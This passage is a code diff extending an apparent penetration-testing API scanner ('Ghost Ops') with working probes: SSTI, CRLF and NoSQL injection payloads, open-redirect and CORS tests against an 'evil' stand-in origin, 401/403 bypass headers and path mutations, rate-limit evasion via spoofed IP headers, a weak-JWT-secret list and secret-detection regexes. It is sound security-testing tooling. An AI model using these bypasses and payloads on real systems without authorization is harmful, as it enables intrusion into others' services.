@@ -11,6 +11,10 @@ import re
 import argparse
 import urllib.parse
 import copy
+import os
+import hmac
+import hashlib
+import base64
 from typing import Dict, List, Any, Tuple, Optional
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, asdict
@@ -47,23 +51,42 @@ class Colors:
     WHITE = '\033[97m'
     BOLD = '\033[1m'
     END = '\033[0m'
+    ORANGE = '\033[38;5;208m'   # Ghost Ops Harley orange
+    GREY = '\033[38;5;240m'     # dark cool grey
+
+
+# Ghost Ops house banner -- figlet "small" font, same style as ghosted_ai.py
+GHOST_BANNER = r"""
+  ___  _  _   ___   ___  _____  ___  _  _   ___     _    ___  ___  ___
+ / __|| || | / _ \ / __||_   _||_ _|| \| | / __|   /_\  | _ \|_ _|/ __|
+| (_ || __ || (_) |\__ \  | |   | | | .` || (_ |  / _ \ |  _/ | | \__ \
+ \___||_||_| \___/ |___/  |_|  |___||_|\_| \___| /_/ \_\|_|  |___||___/
+"""
+
+GHOST_TAGLINE = ("Ghost Ops Security  |  Kill Chain Replay(TM) -- API Track  |  "
+                 "API Vulnerability Scanner v2.1 | Authorized Use Only")
 
 class APIVulnScanner:
-    def __init__(self, base_url: str, headers: Dict = None, proxy: Dict = None, threads: int = 10, cookies: Dict = None):
+    def __init__(self, base_url: str, headers: Dict = None, proxy: Dict = None, threads: int = 10,
+                 cookies: Dict = None, output_dir: str = './reports', skip_chains: bool = False):
         self.base_url = base_url.rstrip('/')
         self.headers = headers or {}
         self.proxy = proxy
         self.threads = threads
         self.cookies = cookies or {}
+        self.output_dir = output_dir
+        self.skip_chains = skip_chains
         self.findings: List[Finding] = []
         self.endpoints: List[Dict] = []
         self.api_schemas: Dict = {}  # Store discovered API schemas
         self.json_patterns: List[Dict] = []  # Store JSON response patterns
+        self.harvested_ids: set = set()  # Object IDs seen in responses (IDOR chain fuel)
+        self.tech_fingerprints: set = set()  # Stack hints from headers/errors
         self.session = requests.Session()
         self.session.headers.update(self.headers)
         if self.cookies:
             self.session.cookies.update(self.cookies)
-        
+
         # Load comprehensive payloads
         self.payloads = self._load_payloads()
         
@@ -208,28 +231,312 @@ class APIVulnScanner:
                 '0.0.0.0',
                 '10.0.0.1',
                 'localhost'
+            ],
+            'ssti': [
+                '{{7*7}}',
+                '${7*7}',
+                '<%= 7*7 %>',
+                '#{7*7}',
+                '*{7*7}',
+                '{{7*\'7\'}}',
+                '${{7*7}}',
+                '@(7*7)'
+            ],
+            'open_redirect': [
+                'https://evil.ghostops-test.com',
+                '//evil.ghostops-test.com',
+                '/\\evil.ghostops-test.com',
+                'https:evil.ghostops-test.com',
+                '%2F%2Fevil.ghostops-test.com'
+            ],
+            'crlf_injection': [
+                '%0d%0aX-Ghost-Injected:%20true',
+                '%0aX-Ghost-Injected:%20true',
+                '%0d%0aSet-Cookie:%20ghost=injected',
+                '\r\nX-Ghost-Injected: true'
+            ],
+            'weak_jwt_secrets': [
+                'secret', 'password', 'changeme', 'key', 'private', 'jwt',
+                'jwt_secret', 'secretkey', 'supersecret', '123456', 'admin',
+                'test', 'dev', 'your-256-bit-secret', 'qwerty'
             ]
         }
 
+    # ------------------------------------------------------------------
+    # Static tables used by the recon / bypass / chain phases
+    # ------------------------------------------------------------------
+
+    # Header sets that commonly flip a 401/403 to a 200 behind reverse
+    # proxies and IP-allowlist middleware.
+    BYPASS_HEADER_SETS = [
+        {'X-Forwarded-For': '127.0.0.1'},
+        {'X-Real-IP': '127.0.0.1'},
+        {'X-Custom-IP-Authorization': '127.0.0.1'},
+        {'X-Originating-IP': '127.0.0.1'},
+        {'X-Forwarded-Host': 'localhost'},
+        {'X-Original-URL': None},   # filled with the target path at test time
+        {'X-Rewrite-URL': None},    # filled with the target path at test time
+    ]
+
+    # Path mutations that dodge naive prefix/exact-match ACLs.
+    PATH_BYPASS_MUTATIONS = [
+        '{path}/.',
+        '{path}/',
+        '/{path}',      # double leading slash once joined
+        '{path}%20',
+        '{path}%09',
+        '{path}..;/',
+        '{path};.json',
+        '{PATH_UPPER}',
+    ]
+
+    # Common OpenAPI/Swagger/API-doc locations for spec-driven enumeration.
+    SPEC_PATHS = [
+        '/openapi.json', '/openapi.yaml', '/swagger.json', '/swagger.yaml',
+        '/swagger/v1/swagger.json', '/api/openapi.json', '/api/swagger.json',
+        '/v2/api-docs', '/v3/api-docs', '/api-docs', '/api/api-docs',
+        '/api/docs/swagger.json', '/.well-known/openapi.json',
+        '/swagger-ui.html', '/swagger-ui/', '/redoc', '/api/schema/',
+    ]
+
+    # Response-body secret patterns -- scanned on every JSON response seen
+    # during discovery, not just on dedicated probes.
+    SECRET_PATTERNS = [
+        (re.compile(r'AKIA[0-9A-Z]{16}'), 'AWS access key id'),
+        (re.compile(r'(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*'), 'JWT token'),
+        (re.compile(r'sk-[A-Za-z0-9]{20,}'), 'secret API key (sk- prefix)'),
+        (re.compile(r'AIza[0-9A-Za-z_\-]{35}'), 'Google API key'),
+        (re.compile(r'xox[bpars]-[0-9A-Za-z\-]{10,}'), 'Slack token'),
+        (re.compile(r'ghp_[A-Za-z0-9]{36}'), 'GitHub personal access token'),
+        (re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH |)PRIVATE KEY-----'), 'PEM private key'),
+        (re.compile(r'(?i)"(?:password|passwd|db_pass|secret_key)"\s*:\s*"[^"]{4,}"'), 'hardcoded credential field'),
+    ]
+
+    # Error/stack-trace fingerprints for the verbose-error probe and for
+    # tech fingerprinting from malformed-input responses.
+    STACK_TRACE_PATTERNS = [
+        ('Traceback (most recent call last)', 'Python'),
+        ('at java.', 'Java'), ('at org.springframework', 'Spring'),
+        ('PHP Fatal error', 'PHP'), ('PHP Warning', 'PHP'),
+        ('System.NullReferenceException', '.NET'), ('at System.', '.NET'),
+        ('Microsoft.AspNetCore', 'ASP.NET Core'),
+        ('node_modules', 'Node.js'), ('at Object.<anonymous>', 'Node.js'),
+        ('actionpack', 'Ruby on Rails'), ('rack.version', 'Ruby/Rack'),
+        ('goroutine ', 'Go'), ('panic: runtime error', 'Go'),
+        ('ORA-', 'Oracle DB'), ('psycopg2', 'PostgreSQL/Python'),
+    ]
+
     def print_banner(self):
-        """Print tool banner"""
-        banner = f"""
-{Colors.CYAN}{Colors.BOLD}
-╔═══════════════════════════════════════════════════════════╗
-║       API Vulnerability Scanner v2.0                      ║
-║            Ghost Ops Security                              ║
-║     Advanced API Testing with Pattern Analysis            ║
-╚═══════════════════════════════════════════════════════════╝
-{Colors.END}
-{Colors.YELLOW}[*] Target: {self.base_url}
+        """Print the Ghost Ops banner + scan configuration"""
+        use_color = sys.stdout.isatty() and os.environ.get('NO_COLOR') is None
+        if use_color:
+            print(f"{Colors.ORANGE}{GHOST_BANNER}{Colors.END}")
+            print(f"{Colors.GREY}{GHOST_TAGLINE}{Colors.END}")
+            print(f"{Colors.GREY}{'-' * 78}{Colors.END}")
+        else:
+            print(GHOST_BANNER)
+            print(GHOST_TAGLINE)
+            print('-' * 78)
+        print(f"""{Colors.YELLOW}[*] Target: {self.base_url}
 [*] Threads: {self.threads}
 [*] Cookies: {'Enabled' if self.cookies else 'None'}
+[*] Attack Chains: {'Disabled' if self.skip_chains else 'Enabled'}
+[*] Report Directory: {self.output_dir}
 [*] JSON Pattern Analysis: Enabled
 [*] API Data Manipulation: Enabled
 [*] Starting scan at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-{Colors.END}
-"""
-        print(banner)
+{Colors.END}""")
+
+    # ==================================================================
+    # Phase 0: Passive recon & spec-driven enumeration
+    # ==================================================================
+
+    def recon_target(self) -> List[str]:
+        """
+        Pre-fuzzing recon: fingerprint the stack from headers, check CORS
+        policy, harvest paths from robots.txt, and hunt for OpenAPI/Swagger
+        specs. Returns extra endpoint paths to feed into discovery.
+        """
+        print(f"\n{Colors.BOLD}[+] Phase 0: Passive Recon & Spec Discovery{Colors.END}")
+        extra_paths = []
+
+        # --- Header fingerprinting -----------------------------------
+        try:
+            response = self.session.get(self.base_url, timeout=10, verify=False, proxies=self.proxy)
+            interesting = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version',
+                           'X-Runtime', 'X-Generator', 'X-Backend-Server', 'Via', 'X-Kong-Proxy-Latency',
+                           'X-Envoy-Upstream-Service-Time', 'X-Amzn-Trace-Id', 'X-Cache']
+            leaked = {h: response.headers[h] for h in interesting if h in response.headers}
+            for header, value in leaked.items():
+                self.tech_fingerprints.add(f"{header}: {value}")
+                print(f"{Colors.CYAN}[*] Fingerprint: {header}: {value}{Colors.END}")
+            if any(h in leaked for h in ('Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version')):
+                self._add_finding(
+                    endpoint=self.base_url, method='GET',
+                    vuln_type='Technology Disclosure via Headers', severity='LOW',
+                    description='Response headers disclose server/framework versions',
+                    payload='N/A', response_code=response.status_code,
+                    evidence='; '.join(f'{k}: {v}' for k, v in leaked.items()),
+                    remediation='Strip or genericize Server/X-Powered-By headers at the proxy layer.'
+                )
+        except Exception:
+            pass
+
+        # --- CORS misconfiguration ------------------------------------
+        self.test_cors_misconfiguration()
+
+        # --- robots.txt path harvest ----------------------------------
+        try:
+            response = self.session.get(f"{self.base_url}/robots.txt", timeout=10, verify=False, proxies=self.proxy)
+            if response.status_code == 200 and 'html' not in response.headers.get('Content-Type', '').lower():
+                harvested = []
+                for line in response.text.splitlines():
+                    match = re.match(r'(?i)(?:dis)?allow:\s*(/\S+)', line.strip())
+                    if match and '*' not in match.group(1):
+                        harvested.append(match.group(1).rstrip('$'))
+                if harvested:
+                    extra_paths.extend(harvested[:30])
+                    print(f"{Colors.GREEN}[✓] robots.txt disclosed {len(harvested)} paths (importing up to 30){Colors.END}")
+        except Exception:
+            pass
+
+        # --- OpenAPI / Swagger spec discovery -------------------------
+        for spec_path in self.SPEC_PATHS:
+            try:
+                response = self.session.get(f"{self.base_url}{spec_path}", timeout=10, verify=False, proxies=self.proxy)
+                if response.status_code != 200:
+                    continue
+                content_type = response.headers.get('Content-Type', '').lower()
+                if spec_path in ('/swagger-ui.html', '/swagger-ui/', '/redoc', '/api/schema/'):
+                    if 'html' in content_type and ('swagger' in response.text.lower() or 'redoc' in response.text.lower()):
+                        print(f"{Colors.YELLOW}[!] API documentation UI exposed: {spec_path}{Colors.END}")
+                        self._add_finding(
+                            endpoint=spec_path, method='GET',
+                            vuln_type='Exposed API Documentation UI', severity='LOW',
+                            description=f'Interactive API docs reachable at {spec_path}',
+                            payload='N/A', response_code=200,
+                            evidence='Swagger/ReDoc UI served',
+                            remediation='Restrict documentation UIs to internal networks in production.'
+                        )
+                    continue
+                try:
+                    spec = response.json()
+                except ValueError:
+                    continue
+                if not isinstance(spec, dict) or not spec.get('paths'):
+                    continue
+                imported = self._import_openapi_paths(spec)
+                self.api_schemas[spec_path] = {'title': spec.get('info', {}).get('title', ''),
+                                               'version': spec.get('info', {}).get('version', ''),
+                                               'path_count': len(spec['paths'])}
+                extra_paths.extend(imported)
+                print(f"{Colors.GREEN}[✓] API spec found at {spec_path}: "
+                      f"{len(spec['paths'])} documented paths imported into scan{Colors.END}")
+                self._add_finding(
+                    endpoint=spec_path, method='GET',
+                    vuln_type='Exposed API Specification', severity='MEDIUM',
+                    description=f'Machine-readable API spec at {spec_path} maps the full attack surface',
+                    payload='N/A', response_code=200,
+                    evidence=f"{len(spec['paths'])} paths, title: {spec.get('info', {}).get('title', 'n/a')}",
+                    remediation='Do not serve OpenAPI/Swagger specs publicly in production unless intended.'
+                )
+            except Exception:
+                pass
+
+        if not extra_paths:
+            print(f"{Colors.YELLOW}[*] No spec/robots paths found -- proceeding with wordlist only{Colors.END}")
+        return extra_paths
+
+    def _import_openapi_paths(self, spec: Dict) -> List[str]:
+        """Turn documented spec paths into concrete probe paths ({id} -> 1)."""
+        imported = []
+        base_path = ''
+        # Swagger 2.0 basePath / OpenAPI 3 servers[0].url path component
+        if isinstance(spec.get('basePath'), str):
+            base_path = spec['basePath'].rstrip('/')
+        elif spec.get('servers'):
+            try:
+                base_path = urllib.parse.urlsplit(spec['servers'][0].get('url', '')).path.rstrip('/')
+            except Exception:
+                base_path = ''
+        for path in list(spec.get('paths', {}).keys())[:150]:
+            concrete = re.sub(r'\{[^}]+\}', '1', path)
+            imported.append(f"{base_path}{concrete}")
+        return imported
+
+    def scan_response_secrets(self, text: str, endpoint: str):
+        """Scan any response body for credential material -- runs during discovery."""
+        if not text:
+            return
+        for pattern, label in self.SECRET_PATTERNS:
+            match = pattern.search(text)
+            if match:
+                self._add_finding(
+                    endpoint=endpoint, method='GET',
+                    vuln_type='Secret/Credential Exposure in Response', severity='CRITICAL',
+                    description=f'{label} present in API response body',
+                    payload='N/A', response_code=200,
+                    evidence=match.group(0)[:60] + ('...' if len(match.group(0)) > 60 else ''),
+                    remediation='Never return credential material in API responses. Rotate the exposed secret immediately.'
+                )
+                print(f"{Colors.RED}[!] {label} exposed in {endpoint}{Colors.END}")
+
+    def _harvest_ids(self, json_data: Any):
+        """Collect object IDs from responses to fuel the IDOR harvest chain."""
+        for path, value in self._find_id_fields(json_data):
+            if isinstance(value, (int, str)) and str(value).strip() and len(str(value)) < 40:
+                self.harvested_ids.add(str(value))
+
+    def enumerate_api_versions(self):
+        """
+        Version sweep: for every discovered versioned path (/v1/, /v2/...),
+        probe sibling versions. Older, forgotten API versions frequently
+        lack the auth/validation fixes applied to the current one.
+        """
+        print(f"\n{Colors.BOLD}[+] Phase 1b: API Version Enumeration{Colors.END}")
+        version_re = re.compile(r'/v(\d+)(?=/|$)')
+        versioned = [e for e in self.endpoints if version_re.search(e['endpoint'])]
+        if not versioned:
+            print(f"{Colors.YELLOW}[*] No versioned paths discovered -- skipping{Colors.END}")
+            return
+
+        tested = set()
+        shadow_found = 0
+        for endpoint_data in versioned[:15]:
+            original = endpoint_data['endpoint']
+            current_version = int(version_re.search(original).group(1))
+            for candidate in range(0, 6):
+                if candidate == current_version:
+                    continue
+                sibling = version_re.sub(f'/v{candidate}', original, count=1)
+                if sibling in tested:
+                    continue
+                tested.add(sibling)
+                try:
+                    response = self.session.request(
+                        endpoint_data['method'], f"{self.base_url}{sibling}",
+                        timeout=10, verify=False, allow_redirects=False, proxies=self.proxy)
+                    if response.status_code not in (404, 501):
+                        shadow_found += 1
+                        severity = 'HIGH' if candidate < current_version else 'MEDIUM'
+                        print(f"{Colors.YELLOW}[!] Alternate API version live: {sibling} "
+                              f"(HTTP {response.status_code}){Colors.END}")
+                        self._add_finding(
+                            endpoint=sibling, method=endpoint_data['method'],
+                            vuln_type='Shadow/Legacy API Version Accessible', severity=severity,
+                            description=f'Version sibling of {original} responds -- legacy versions often lack current auth fixes',
+                            payload='N/A', response_code=response.status_code,
+                            evidence=f'HTTP {response.status_code}, {len(response.content)} bytes',
+                            remediation='Decommission or gate legacy API versions; apply auth fixes across all versions.'
+                        )
+                        self.endpoints.append({'endpoint': sibling, 'method': endpoint_data['method'],
+                                               'status': response.status_code,
+                                               'content_type': response.headers.get('Content-Type', ''),
+                                               'length': len(response.content), 'has_json': False})
+                except Exception:
+                    pass
+        if not shadow_found:
+            print(f"{Colors.GREEN}[+] No alternate versions responded{Colors.END}")
 
     def analyze_json_response(self, response: requests.Response, endpoint: str) -> Dict:
         """Analyze JSON response for patterns and structure"""
@@ -491,10 +798,10 @@ class APIVulnScanner:
         else:
             current[final_key] = value
 
-    def discover_endpoints(self, wordlist: List[str] = None) -> List[Dict]:
-        """Discover API endpoints through fuzzing"""
+    def discover_endpoints(self, wordlist: List[str] = None, extra_paths: List[str] = None) -> List[Dict]:
+        """Discover API endpoints through fuzzing (wordlist + recon-derived paths)"""
         print(f"\n{Colors.BOLD}[+] Phase 1: Attack Surface Mapping{Colors.END}")
-        
+
         common_endpoints = wordlist or [
             '/api/v1/users', '/api/v2/users', '/api/users',
             '/api/v1/admin', '/api/admin',
@@ -519,9 +826,36 @@ class APIVulnScanner:
             '/.git/config', '/.env', '/api/.env',
             '/api/v1/payments', '/api/payments',
             '/api/v1/cart', '/api/cart',
-            '/api/v1/checkout', '/api/checkout'
+            '/api/v1/checkout', '/api/checkout',
+            # Auth/token surface
+            '/api/v1/token', '/api/token', '/oauth/token', '/oauth/authorize',
+            '/api/auth/refresh', '/api/v1/auth/refresh', '/api/auth/reset',
+            '/api/v1/password/reset', '/api/forgot-password',
+            '/api/v1/apikeys', '/api/keys', '/api/v1/api-keys',
+            '/.well-known/oauth-authorization-server', '/.well-known/openid-configuration',
+            # Multi-tenant / RBAC surface
+            '/api/v1/roles', '/api/roles', '/api/v1/permissions', '/api/permissions',
+            '/api/v1/tenants', '/api/tenants', '/api/v1/organizations', '/api/organizations',
+            '/api/v1/teams', '/api/v1/groups', '/api/v1/invites', '/api/v1/members',
+            # Business-object surface
+            '/api/v1/invoices', '/api/invoices', '/api/v1/transactions', '/api/transactions',
+            '/api/v1/notifications', '/api/notifications', '/api/v1/webhooks', '/api/webhooks',
+            '/api/v1/files', '/api/files', '/api/v1/documents', '/api/documents',
+            '/api/v1/reports', '/api/v1/audit', '/api/v1/billing', '/api/billing',
+            # Framework/infra endpoints frequently left exposed
+            '/actuator', '/actuator/env', '/actuator/health', '/actuator/mappings',
+            '/actuator/heapdump', '/actuator/httptrace',
+            '/debug', '/api/debug', '/console', '/api/console',
+            '/metrics', '/api/metrics', '/trace', '/api/trace',
+            '/server-status', '/api/internal', '/internal', '/private', '/api/private',
         ]
-        
+
+        if extra_paths:
+            merged = list(dict.fromkeys(common_endpoints + extra_paths))
+            print(f"{Colors.CYAN}[*] Including {len(merged) - len(common_endpoints)} recon-derived paths "
+                  f"(specs/robots.txt){Colors.END}")
+            common_endpoints = merged
+
         methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
         discovered = []
         
@@ -546,6 +880,10 @@ class APIVulnScanner:
                             print(f"{Colors.CYAN}    → JSON Analysis: {len(analysis.get('sensitive_keys', []))} sensitive keys, "
                                   f"{len(analysis.get('numeric_fields', []))} numeric fields, "
                                   f"{len(analysis.get('boolean_fields', []))} boolean fields{Colors.END}")
+                        # Feed the attack chains: harvest object IDs and scan
+                        # every JSON body for leaked credential material.
+                        self._harvest_ids(result['json_data'])
+                        self.scan_response_secrets(json.dumps(result['json_data']), result['endpoint'])
         
         self.endpoints = discovered
         print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Discovered {len(discovered)} active endpoints{Colors.END}\n")
@@ -934,6 +1272,32 @@ class APIVulnScanner:
                 manipulation_details=f'{success_count} requests succeeded'
             )
             print(f"{Colors.YELLOW}[!] No rate limiting detected{Colors.END}")
+        else:
+            # Rate limiting IS present -- test whether spoofed client-IP
+            # headers reset the bucket (per-IP limits keyed on XFF).
+            for spoofed_ip in self.payloads['rate_limit_bypass']:
+                try:
+                    response = self.session.request(
+                        test_endpoint['method'], url,
+                        headers={'X-Forwarded-For': spoofed_ip, 'X-Real-IP': spoofed_ip},
+                        timeout=5, verify=False, proxies=self.proxy)
+                    if response.status_code != 429:
+                        self._add_finding(
+                            endpoint=test_endpoint['endpoint'],
+                            method=test_endpoint['method'],
+                            vuln_type='Rate Limit Bypass via IP Spoofing Headers',
+                            severity='MEDIUM',
+                            description='Rate limit resets when X-Forwarded-For/X-Real-IP is changed',
+                            payload=f'X-Forwarded-For: {spoofed_ip}',
+                            response_code=response.status_code,
+                            evidence=f'429 became {response.status_code} with spoofed client IP',
+                            remediation='Key rate limits on authenticated identity or the true socket IP, not client-supplied headers.',
+                            manipulation_details=f'Spoofed IP: {spoofed_ip}'
+                        )
+                        print(f"{Colors.YELLOW}[!] Rate limit bypassed via X-Forwarded-For: {spoofed_ip}{Colors.END}")
+                        break
+                except Exception:
+                    pass
 
     def fuzz_parameters(self, endpoint_data: Dict):
         """Fuzz endpoint parameters"""
@@ -1245,6 +1609,469 @@ class APIVulnScanner:
                     )
                     print(f"{Colors.RED}[!] IDOR found in parameter: {param}{Colors.END}")
 
+    # ==================================================================
+    # API-specific attack methods (OWASP API Security Top 10)
+    # ==================================================================
+
+    def test_nosql_injection(self, endpoint_data: Dict, params: List[str]):
+        """Test for NoSQL (MongoDB-style) operator injection -- API5/API8"""
+        print(f"{Colors.YELLOW}[*] Testing NoSQL Injection...{Colors.END}")
+
+        url = f"{self.base_url}{endpoint_data['endpoint']}"
+
+        for param in params:
+            for payload in self.payloads['nosqli']:
+                try:
+                    parsed_payload = json.loads(payload)
+                except ValueError:
+                    parsed_payload = payload
+
+                try:
+                    start_time = time.time()
+                    if endpoint_data['method'] == 'GET':
+                        # Operator injection via bracketed query params: param[$ne]=
+                        if isinstance(parsed_payload, dict):
+                            operator = list(parsed_payload.keys())[0]
+                            test_params = {f"{param}[{operator}]": parsed_payload[operator]}
+                        else:
+                            test_params = {param: payload}
+                        response = self.session.get(url, params=test_params, timeout=15, verify=False, proxies=self.proxy)
+                    else:
+                        response = self.session.request(endpoint_data['method'], url,
+                                                        json={param: parsed_payload},
+                                                        timeout=15, verify=False, proxies=self.proxy)
+                    elapsed = time.time() - start_time
+
+                    nosql_errors = ['mongoerror', 'mongodb', 'bson', 'cast to objectid',
+                                    'e11000', '$where', 'mapreduce', 'couchdb', 'unexpected token $']
+                    response_lower = response.text.lower()
+
+                    if any(err in response_lower for err in nosql_errors):
+                        self._add_finding(
+                            endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
+                            vuln_type='NoSQL Injection', severity='CRITICAL',
+                            description=f'NoSQL operator injection in parameter "{param}"',
+                            payload=payload, response_code=response.status_code,
+                            evidence='NoSQL engine error pattern in response',
+                            remediation='Sanitize operator keys ($gt/$ne/$where) from user input; use typed query builders.'
+                        )
+                        print(f"{Colors.RED}[!] NoSQL Injection found in parameter: {param}{Colors.END}")
+                        break
+
+                    # $where sleep-based blind detection
+                    if 'sleep' in payload and elapsed > 4:
+                        self._add_finding(
+                            endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
+                            vuln_type='Blind NoSQL Injection (Time-based)', severity='CRITICAL',
+                            description=f'$where sleep() delay observed via parameter "{param}"',
+                            payload=payload, response_code=response.status_code,
+                            evidence=f'Response delayed {elapsed:.2f}s',
+                            remediation='Disable $where/server-side JS in MongoDB; sanitize operator input.'
+                        )
+                        print(f"{Colors.RED}[!] Blind NoSQL Injection found in parameter: {param}{Colors.END}")
+                except Exception:
+                    pass
+
+    def test_ssti(self, endpoint_data: Dict, params: List[str]):
+        """Test for server-side template injection in API parameters"""
+        print(f"{Colors.YELLOW}[*] Testing SSTI...{Colors.END}")
+
+        url = f"{self.base_url}{endpoint_data['endpoint']}"
+
+        for param in params:
+            for payload in self.payloads['ssti']:
+                test_data = {param: payload}
+                try:
+                    if endpoint_data['method'] == 'GET':
+                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
+                    else:
+                        response = self.session.request(endpoint_data['method'], url, json=test_data,
+                                                        timeout=10, verify=False, proxies=self.proxy)
+
+                    # 7*7 evaluated -> 49 present WITHOUT the raw payload echoed back
+                    if '49' in response.text and payload not in response.text:
+                        self._add_finding(
+                            endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
+                            vuln_type='Server-Side Template Injection (SSTI)', severity='CRITICAL',
+                            description=f'Template expression evaluated in parameter "{param}"',
+                            payload=payload, response_code=response.status_code,
+                            evidence=f'Payload {payload} evaluated to 49',
+                            remediation='Never pass user input into template engines; use sandboxed/logic-less templates.'
+                        )
+                        print(f"{Colors.RED}[!] SSTI found in parameter: {param} ({payload}){Colors.END}")
+                        break
+                except Exception:
+                    pass
+
+    def test_403_bypass(self, endpoint_data: Dict):
+        """Header/path-mutation bypass battery for 401/403-gated endpoints"""
+        if endpoint_data.get('status') not in (401, 403):
+            return
+
+        path = endpoint_data['endpoint']
+        print(f"{Colors.YELLOW}[*] Testing 401/403 bypass on {path}...{Colors.END}")
+
+        # -- Header-based bypasses ------------------------------------
+        for header_set in self.BYPASS_HEADER_SETS:
+            test_headers = {}
+            for header, value in header_set.items():
+                test_headers[header] = path if value is None else value
+            try:
+                # X-Original-URL/X-Rewrite-URL tricks are sent against "/"
+                probe_path = '/' if any(h in ('X-Original-URL', 'X-Rewrite-URL') for h in test_headers) else path
+                response = self.session.request(
+                    endpoint_data['method'], f"{self.base_url}{probe_path}",
+                    headers=test_headers, timeout=10, verify=False,
+                    allow_redirects=False, proxies=self.proxy)
+                if response.status_code in (200, 201, 204):
+                    self._add_finding(
+                        endpoint=path, method=endpoint_data['method'],
+                        vuln_type='Access Control Bypass via Header', severity='CRITICAL',
+                        description=f'{endpoint_data["status"]} gate bypassed with header(s): {", ".join(test_headers)}',
+                        payload=json.dumps(test_headers), response_code=response.status_code,
+                        evidence=f'HTTP {endpoint_data["status"]} became {response.status_code}',
+                        remediation='Enforce authorization at the application layer, not via proxy path/IP heuristics. Strip client-supplied forwarding headers at the edge.'
+                    )
+                    print(f"{Colors.RED}[!] 403 bypass via headers: {list(test_headers.keys())}{Colors.END}")
+                    return
+            except Exception:
+                pass
+
+        # -- Path-mutation bypasses -----------------------------------
+        for mutation in self.PATH_BYPASS_MUTATIONS:
+            mutated = mutation.replace('{path}', path).replace('{PATH_UPPER}', path.upper())
+            try:
+                response = self.session.request(
+                    endpoint_data['method'], f"{self.base_url}{mutated}",
+                    timeout=10, verify=False, allow_redirects=False, proxies=self.proxy)
+                if response.status_code in (200, 201, 204):
+                    self._add_finding(
+                        endpoint=path, method=endpoint_data['method'],
+                        vuln_type='Access Control Bypass via Path Mutation', severity='CRITICAL',
+                        description=f'{endpoint_data["status"]} gate bypassed by requesting "{mutated}"',
+                        payload=mutated, response_code=response.status_code,
+                        evidence=f'HTTP {endpoint_data["status"]} became {response.status_code}',
+                        remediation='Normalize paths before ACL checks; deny by default on ambiguous parses.'
+                    )
+                    print(f"{Colors.RED}[!] 403 bypass via path mutation: {mutated}{Colors.END}")
+                    return
+            except Exception:
+                pass
+
+    def test_http_method_override(self, endpoint_data: Dict):
+        """Test X-HTTP-Method-Override acceptance -- lets POST masquerade as DELETE/PUT"""
+        url = f"{self.base_url}{endpoint_data['endpoint']}"
+        override_headers = ['X-HTTP-Method-Override', 'X-HTTP-Method', 'X-Method-Override']
+
+        for header in override_headers:
+            try:
+                # Send POST claiming to be DELETE; if response differs from a
+                # plain POST *and* from a real DELETE 405, the override is honored.
+                plain = self.session.post(url, timeout=10, verify=False,
+                                          allow_redirects=False, proxies=self.proxy)
+                overridden = self.session.post(url, headers={header: 'DELETE'}, timeout=10,
+                                               verify=False, allow_redirects=False, proxies=self.proxy)
+                if (overridden.status_code != plain.status_code
+                        and overridden.status_code not in (400, 404, 405, 501)):
+                    self._add_finding(
+                        endpoint=endpoint_data['endpoint'], method='POST',
+                        vuln_type='HTTP Method Override Honored', severity='HIGH',
+                        description=f'{header}: DELETE changes server behavior on POST -- method-scoped ACLs can be sidestepped',
+                        payload=f'{header}: DELETE', response_code=overridden.status_code,
+                        evidence=f'POST={plain.status_code} vs POST+override={overridden.status_code}',
+                        remediation='Disable method-override middleware or enforce authorization on the effective method.'
+                    )
+                    print(f"{Colors.RED}[!] Method override honored via {header}{Colors.END}")
+                    return
+            except Exception:
+                pass
+
+    def test_cors_misconfiguration(self):
+        """Check for reflected-Origin / wildcard-with-credentials CORS policies"""
+        print(f"{Colors.YELLOW}[*] Testing CORS policy...{Colors.END}")
+        evil_origin = 'https://evil.ghostops-test.com'
+        try:
+            response = self.session.get(self.base_url, headers={'Origin': evil_origin},
+                                        timeout=10, verify=False, proxies=self.proxy)
+            allow_origin = response.headers.get('Access-Control-Allow-Origin', '')
+            allow_creds = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
+
+            if allow_origin == evil_origin:
+                severity = 'HIGH' if allow_creds else 'MEDIUM'
+                self._add_finding(
+                    endpoint=self.base_url, method='GET',
+                    vuln_type='CORS Origin Reflection', severity=severity,
+                    description='Arbitrary Origin reflected in Access-Control-Allow-Origin'
+                                + (' WITH credentials allowed' if allow_creds else ''),
+                    payload=f'Origin: {evil_origin}', response_code=response.status_code,
+                    evidence=f'ACAO: {allow_origin}, ACAC: {allow_creds}',
+                    remediation='Whitelist exact trusted origins; never reflect the request Origin with credentials enabled.'
+                )
+                print(f"{Colors.RED}[!] CORS reflects arbitrary Origin (credentials={allow_creds}){Colors.END}")
+            elif allow_origin == '*' and allow_creds:
+                self._add_finding(
+                    endpoint=self.base_url, method='GET',
+                    vuln_type='CORS Wildcard with Credentials', severity='MEDIUM',
+                    description='Access-Control-Allow-Origin: * combined with credentials',
+                    payload=f'Origin: {evil_origin}', response_code=response.status_code,
+                    evidence='ACAO: *, ACAC: true',
+                    remediation='Remove Access-Control-Allow-Credentials or restrict origins.'
+                )
+                print(f"{Colors.YELLOW}[!] CORS wildcard with credentials{Colors.END}")
+        except Exception:
+            pass
+
+    def test_verbose_errors(self, endpoint_data: Dict):
+        """Send malformed bodies and look for stack traces / debug output"""
+        url = f"{self.base_url}{endpoint_data['endpoint']}"
+        malformed_bodies = [
+            ('{"broken":', 'application/json'),
+            ('<' * 50, 'application/json'),
+            ('a' * 20000, 'application/json'),
+            ('{"a": 1e99999}', 'application/json'),
+        ]
+        for body, content_type in malformed_bodies:
+            try:
+                response = self.session.post(url, data=body,
+                                             headers={'Content-Type': content_type},
+                                             timeout=10, verify=False, proxies=self.proxy)
+                for pattern, tech in self.STACK_TRACE_PATTERNS:
+                    if pattern in response.text:
+                        self.tech_fingerprints.add(f'stack trace: {tech}')
+                        self._add_finding(
